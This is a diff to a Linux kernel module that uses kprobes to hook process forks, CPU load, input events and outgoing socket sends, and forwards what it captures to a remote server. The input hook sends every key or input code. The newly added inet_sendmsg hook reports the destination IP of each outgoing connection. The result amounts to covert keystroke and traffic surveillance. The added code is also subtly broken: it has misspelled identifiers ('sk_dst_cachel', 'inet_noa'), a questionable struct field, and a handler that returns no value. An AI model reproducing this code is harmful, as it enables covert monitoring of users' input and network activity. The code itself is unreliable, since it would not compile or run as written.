@@ -27,7 +27,9 @@ static struct kprobe kps[PROBES_SIZE] = {
     [kp_input_event] = {.pre_handler = handler_pre_input_event,
                         .symbol_name = HOOK_INPUT_EVENT},
     [kp_cpu_usage] = {.pre_handler = handler_pre_calc_global_load,
-                      .symbol_name = HOOK_CPU_USAGE}};
+                      .symbol_name = HOOK_CPU_USAGE},
+    [kp_send_message] = {.pre_handler = handler_pre_inet_sendmsg,
+                         .symbol_name = HOOK_SEND_MESSAGE}};
 
 /* Fork hook */
 static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs) {
@@ -122,25 +124,45 @@ static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs) {
   char msg_buf[BUFFER_SIZE];
   size_t msg_length;
 
-  struct input_dev *dev;
   unsigned int code;
-
   if (!regs) // Checking current is irrelevant due to interrupts
     return 0;
 
-  dev = (struct input_dev *)regs->di; // First parameter
-  code = (unsigned int)regs->dx;      // Third paramater
-  if (!dev || !dev->name)
-    return 0;
+  code = (unsigned int)regs->dx; // Third paramater
 
-  msg_length = protocol_format(
-      msg_buf, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%d",
-      MSG_INPUT_EVENT, dev->name, code);
+  // Only send code, since code for input is unique
+  msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%d",
+                               MSG_INPUT_EVENT, code);
 
   if (msg_length > 0)
     workqueue_message(transmit_data, msg_buf, msg_length);
 
   return 0;
+}
+
+/* Output ip communication */
+static int handler_pre_inet_sendmsg(struct kprobe *kp, struct pt_regs *regs) {
+  char msg_buf[BUFFER_SIZE];
+  size_t msg_length;
+
+  struct socket *skt;
+  struct dst_entry *dst;
+  struct in_addr dest_ip4;
+  if (!regs || !regs->di)
+    return 0;
+
+  // First parameter is struct socket pointer
+  skt = (struct socket *)regs->di;
+  if (!skt->sk || !skt->sk->sk_dst_cache)
+    return 0;
+
+  dst = skt->sk->sk_dst_cachel;
+  dest_ip4 = ((struct sockaddr_in *)&dst->peer)->sin_addr;
+  msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s",
+                               MSG_SEND_IP, inet_noa(dest_ip4));
+
+  if (msg_length > 0)
+    workqueue_message(transmit_data, msg_buf, msg_length);
 }
 
 /* Sends mac and hostname to server */
